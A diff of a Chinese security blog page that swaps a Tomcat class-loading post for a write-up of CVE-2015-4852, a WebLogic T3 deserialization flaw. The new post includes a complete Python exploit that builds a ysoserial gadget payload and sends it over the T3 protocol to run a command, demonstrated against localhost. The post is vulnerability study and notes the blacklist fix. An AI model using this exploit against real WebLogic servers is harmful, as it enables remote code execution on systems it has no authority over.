@@ -22,33 +22,25 @@
     var CONFIG = {"hostname":"ctwabc.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#4A90D9","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="写这个主要是因为，在Shiro550中利用CC链的时候涉及到不能使用数组的问题。  Shiro550中使用的是原生的反序列化，但是有一处需要注意。">
+  <meta name="description" content="环境 jdk7u21 weblogic 12.1.3.0.0 个人推荐使用12.1.3.0.0版本的weblogic，10.3.6版本因为太老了会报空间不足的错误，网上的解决方案不知道为什么失败了。但12.1.3版本就没有什么问题了。 T3协议 T3协议是Weblogic中独有的协议，Weblogic中RMI传输使用的就是T3协议。因为T3协议本来的目的就是为了这些反序列化和序列化，所以这个漏洞就">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Tomcat类加载">
-<meta property="og:url" content="http://ctwabc.github.io/2026/06/12/tomcatcl/index.html">
+<meta property="og:title" content="CVE-2015-4852 WebLogic T3 反序列化">
+<meta property="og:url" content="http://ctwabc.github.io/2026/06/22/weblogic1/index.html">
 <meta property="og:site_name" content="ctwabc&#39;s Blog">
-<meta property="og:description" content="写这个主要是因为，在Shiro550中利用CC链的时候涉及到不能使用数组的问题。  Shiro550中使用的是原生的反序列化，但是有一处需要注意。">
+<meta property="og:description" content="环境 jdk7u21 weblogic 12.1.3.0.0 个人推荐使用12.1.3.0.0版本的weblogic，10.3.6版本因为太老了会报空间不足的错误，网上的解决方案不知道为什么失败了。但12.1.3版本就没有什么问题了。 T3协议 T3协议是Weblogic中独有的协议，Weblogic中RMI传输使用的就是T3协议。因为T3协议本来的目的就是为了这些反序列化和序列化，所以这个漏洞就">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/12/tomcatcl/tomcatcl1.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/12/tomcatcl/tomcatcl2.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/12/tomcatcl/tomcatcl3.jpg">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/12/tomcatcl/tomcatcl4.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/12/tomcatcl/tomcatcl5.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/12/tomcatcl/tomcatcl6.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/12/tomcatcl/tomcatcl7.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/12/tomcatcl/tomcatcl8.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/12/tomcatcl/tomcatcl9.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/12/tomcatcl/tomcatcl10.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/12/tomcatcl/tomcatcl11.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/12/tomcatcl/tomcatcl12.png">
-<meta property="article:published_time" content="2026-06-12T09:06:32.000Z">
-<meta property="article:modified_time" content="2026-06-19T09:14:24.873Z">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/22/weblogic1/weblogic4.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/22/weblogic1/weblogic1.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/22/weblogic1/weblogic2.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/22/weblogic1/weblogic3.png">
+<meta property="article:published_time" content="2026-06-22T06:30:46.000Z">
+<meta property="article:modified_time" content="2026-06-22T08:06:59.286Z">
 <meta property="article:author" content="ctwabc">
 <meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://ctwabc.github.io/2026/06/12/tomcatcl/tomcatcl1.png">
+<meta name="twitter:image" content="http://ctwabc.github.io/2026/06/22/weblogic1/weblogic4.png">
 
-<link rel="canonical" href="http://ctwabc.github.io/2026/06/12/tomcatcl/">
+<link rel="canonical" href="http://ctwabc.github.io/2026/06/22/weblogic1/">
 
 
 <script id="page-configurations">
@@ -89,7 +81,7 @@
 <meta property="og:image" content="https://github.com/ctwabc.png">
 <meta name="twitter:card" content="summary">
 
-  <title>Tomcat类加载 | ctwabc's Blog</title>
+  <title>CVE-2015-4852 WebLogic T3 反序列化 | ctwabc's Blog</title>
   
 
 
@@ -197,7 +189,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/12/tomcatcl/">
+    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/22/weblogic1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://github.com/ctwabc.png">
@@ -210,7 +202,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Tomcat类加载<a href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name_posts/tomcatcl.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pencil-alt"></i></a>
+          CVE-2015-4852 WebLogic T3 反序列化<a href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name_posts/weblogic1.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pencil-alt"></i></a>
         </h1>
 
         <div class="post-meta">
@@ -219,24 +211,9 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2026-06-12 17:06:32" itemprop="dateCreated datePublished" datetime="2026-06-12T17:06:32+08:00">2026-06-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-06-19 17:14:24" itemprop="dateModified" datetime="2026-06-19T17:14:24+08:00">2026-06-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
-                </span>
+              <time title="创建时间：2026-06-22 14:30:46 / 修改时间：16:06:59" itemprop="dateCreated datePublished" datetime="2026-06-22T14:30:46+08:00">2026-06-22</time>
             </span>
 
           <br>
@@ -245,7 +222,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1k</span>
+              <span>2.5k</span>
             </span>
 
         </div>
@@ -257,42 +234,32 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <blockquote>
-<p>写这个主要是因为，在Shiro550中利用CC链的时候涉及到不能使用数组的问题。</p>
+        <p><em><strong>环境</strong></em></p>
+<p>jdk7u21 weblogic 12.1.3.0.0</p>
+<p>个人推荐使用12.1.3.0.0版本的weblogic，10.3.6版本因为太老了会报空间不足的错误，网上的解决方案不知道为什么失败了。但12.1.3版本就没有什么问题了。</p>
+<p><em><strong>T3协议</strong></em></p>
+<p>T3协议是Weblogic中独有的协议，Weblogic中RMI传输使用的就是T3协议。因为T3协议本来的目的就是为了这些反序列化和序列化，所以这个漏洞就利用上了。</p>
+<p><img src="/2026/06/22/weblogic1/weblogic4.png" alt="截图"></p>
+<p>T3协议的包非常简洁，发了T3包的话，就会返回Weblogic的版本号。</p>
+<p><em><strong>分析</strong></em></p>
+<p><img src="/2026/06/22/weblogic1/weblogic1.png" alt="截图"></p>
+<p>所有的T3流量都会经过<code>InboundMsgAbbrev</code>，走到case0。他会先new一个类出来我们看一下</p>
+<p><img src="/2026/06/22/weblogic1/weblogic2.png" alt="截图"></p>
+<p>这个类继承了ObjectInputStream，且只有图上这些方法。所以说readObject调用的就是ObjectInputStream的readObject了。跟jdk原生的反序列化的唯一的区别就是resolveClass。</p>
+<p><img src="/2026/06/22/weblogic1/weblogic3.png" alt="截图"></p>
+<p>总的来说还是调用了ObjectInputStream的resolveClass()，这个方法的后续处理没什么影响。剩下的部分就跟jdk的反序列化没有区别了。</p>
+<blockquote>
+<p>学到这里才发现我对jdk原生的反序列化流程并不了解，一直以为会直接调用序列化传过来的类的readObject方法。</p>
 </blockquote>
-<p>Shiro550中使用的是原生的反序列化，但是有一处需要注意。</p>
-<span id="more"></span>
+<p>这是网上找的利用代码，根据自己的环境稍作修改的版本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload1</span>(<span class="params">gadget, command</span>):</span><br><span class="line">    JAVA_BIN = <span class="string">&#x27;/Library/Java/JavaVirtualMachines/jdk1.7.0_21.jdk/Contents/Home/bin/java&#x27;</span></span><br><span class="line">    JAR_FILE = <span class="string">&#x27;ysoserial.jar&#x27;</span></span><br><span class="line">    popen = subprocess.Popen([JAVA_BIN, <span class="string">&#x27;-jar&#x27;</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload2</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">host, port, payload</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;HELO:(.*).false&quot;</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(version) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Weblogic &#123;&#125;&quot;</span>.<span class="built_in">format</span>(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>) <span class="comment">#数据包长度，先占位，后面会根据实际情况重新</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="comment">#t3协议头</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;Jdk7u21&quot;</span> <span class="comment">#CommonsCollections1 Jdk7u21</span></span><br><span class="line">    command = <span class="string">&quot;open -a calculator&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    exp(host, port, payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/06/12/tomcatcl/tomcatcl1.png" alt="截图"></p>
-<p>new的时候用的是ClassResolvingObjectInputStream()。</p>
-<p>我们来看一下这个类</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl2.png" alt="截图"></p>
-<p>他只重写了一个方法，而这个方法在反序列化的途中是必定会调用的，就是因为这个不能使用数组。</p>
-<p>我们先看一下Tomcat的类加载器</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl3.jpg" alt="截图"></p>
-<p>WebAppClassloader交给BootstrapClassloader，BootstrapClassloader没找到直接给到WebAppClassloader</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl4.png" alt="截图"></p>
-<p>用这个类加载器，跟进</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl5.png" alt="截图"></p>
-<p>这里就是loadClass的核心逻辑了。检查tomcat缓存里有没有类。</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl6.png" alt="截图"></p>
-<p>检查jdk缓存里有没有。然后使用ExtClassloader(BootstrapClassloader没办法直接获得，就得让Ext帮忙代劳了，因为根据双亲委派会交给Bootstrap)</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl7.png" alt="截图"></p>
-<p>这里就是tomcat的类加载器工作的部分了。到这个findclass里面，总的来说他干的跟URLClassLoader的findclass一样。我们看一下</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl8.png" alt="截图"></p>
-<p>这是findclass，然后会走到findclassinternal</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl9.png" alt="截图"></p>
-<p>看注释，干的事情跟URLClassloader一样。</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl10.png" alt="截图"></p>
-<p>最后调用defineclass。</p>
-<p>问题出在找不到路径。</p>
-<p>transformer传过去的时候长这样[Lorg.apache.commons.collections.Transformer; findclass将.换成&#x2F;加.class。没有这样的路径，他没有对[L做处理。</p>
-<p>jdk原生的类加载是对这种情况是做了处理的，而且forname是支持[L这种格式的，但是shiro走的是ClassUtils.forname，不是class.forname。</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl11.png" alt="截图"></p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl12.png" alt="截图"></p>
-<p>可以看到他们都用了Class.forname，所以说这种数组类不能加载的情况要发生，还得是使用的类加载器得是webappclasloader这种情况。</p>
-<p>推荐视频: <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1dq4y1B76x/?spm_id_from=333.1387.upload.video_card.click&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1dq4y1B76x/?spm_id_from=333.1387.upload.video_card.click&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
-<p>参考文章:<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2449663">https://cloud.tencent.com/developer/article/2449663</a></p>
+<p>总的来说就是把序列化数据包装成T3数据</p>
+<p><em><strong>修复</strong></em></p>
+<p>在resolveClass里放了个黑名单，禁止一些类反序列化。</p>
+<p>参考文章:<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/226070">https://www.anquanke.com/post/id/226070</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14127885.html">https://www.cnblogs.com/nice0e3/p/14127885.html</a></p>
 
     </div>
 
@@ -312,13 +279,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2026/06/12/loadclass/" rel="prev" title="Java类加载">
-      <i class="fa fa-chevron-left"></i> Java类加载
+    <a href="/2026/06/20/el/" rel="prev" title="EL表达式">
+      <i class="fa fa-chevron-left"></i> EL表达式
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2026/06/13/shiro721/" rel="next" title="shiro721">
-      shiro721 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
